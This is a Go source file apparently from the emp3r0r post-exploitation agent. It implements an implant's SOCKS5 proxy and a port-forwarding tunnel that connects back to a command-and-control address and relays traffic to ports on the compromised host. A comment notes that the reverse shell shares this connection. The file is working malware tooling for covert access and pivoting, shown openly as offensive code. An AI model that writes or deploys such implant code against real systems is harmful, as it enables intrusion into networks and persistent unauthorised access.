package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

// Socks5Proxy sock5 proxy server on agent, to use it, forward port 10800 to CC
func Socks5Proxy(op string) (err error) {
	switch op {
	case "on":
		go socks5Start()
	case "off":
		log.Print("Stopping Socks5Proxy")
		if ProxyServer == nil {
			return errors.New("Proxy server is not running")
		}
		err = ProxyServer.Stop()
		if err != nil {
			log.Print(err)
		}
	default:
		return errors.New("Operation not supported")
	}

	return err
}

func socks5Start() {
	var err error
	if ProxyServer == nil {
		socks5.Debug = true
		ProxyServer, err = socks5.NewClassicServer("127.0.0.1:10800", "127.0.0.1", "", "", 0, 0, 0, 60)
		if err != nil {
			log.Println(err)
			return
		}
	}

	log.Print("Socks5Proxy started")
	err = ProxyServer.Run(nil)
	if err != nil {
		log.Println(err)
	}
	log.Print("Socks5Proxy stopped")
}

// PortFwd port mapping, receive CC's request data then send it to target port on agent
func PortFwd(toPort, sessionID string) (err error) {
	var (
		url  = CCAddress + tun.ProxyAPI
		port int

		// buffers
		sendcc = make(chan []byte)
		recvcc = make(chan []byte)

		// connection
		conn   *h2conn.Conn // reverse shell uses this connection
		ctx    context.Context
		cancel context.CancelFunc
	)
	port, err = strconv.Atoi(toPort)
	if err != nil {
		return err
	}
	log.Printf("PortFwd: -> %d (%s)", port, sessionID)

	// request a port fwd
	// connect CC
	conn, ctx, cancel, err = ConnectCC(url)

	go fwdToDport(ctx, cancel, port, sendcc, recvcc)

	defer func() {
		cancel()
		conn.Close()
	}()

	go func() {
		for ctx.Err() == nil {
			// if connection does not exist yet
			if conn == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			data := make([]byte, ProxyBufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print("Read remote: ", err)
				cancel()
				return
			}
			recvcc <- data
		}
	}()

	for outgoing := range sendcc {
		select {
		case <-ctx.Done():
			return
		default:
			// if connection does not exist yet
			if conn == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			_, err = conn.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
				return
			}
		}
	}

	return
}

func fwdToDport(ctx context.Context, cancel context.CancelFunc,
	dport int, send chan []byte, recv chan []byte) {
	defer func() {
		cancel()
		log.Printf("fwdToDport %d exited", dport)
	}()
	var err error

	// connect to target port
	destAddr := fmt.Sprintf("127.0.0.1:%d", dport)
	dest, err := net.Dial("tcp", destAddr)
	if err != nil {
		log.Printf("fwdToDport %d: %v", dport, err)
		return
	}

	// read from CC, send to target port
	go func() {
		defer func() { cancel() }()
		for incoming := range recv {
			select {
			case <-ctx.Done():
				return
			default:
				_, err := dest.Write(incoming)
				if err != nil {
					log.Printf("write to port %d: %v", dport, err)
					return
				}
			}
		}
	}()

	// read from target port, send to CC
	for ctx.Err() == nil {
		buf := make([]byte, ProxyBufSize)
		_, err = dest.Read(buf)
		send <- buf
		if err != nil {
			log.Printf("port %d read: %v", dport, err)
			return
		}
	}
}
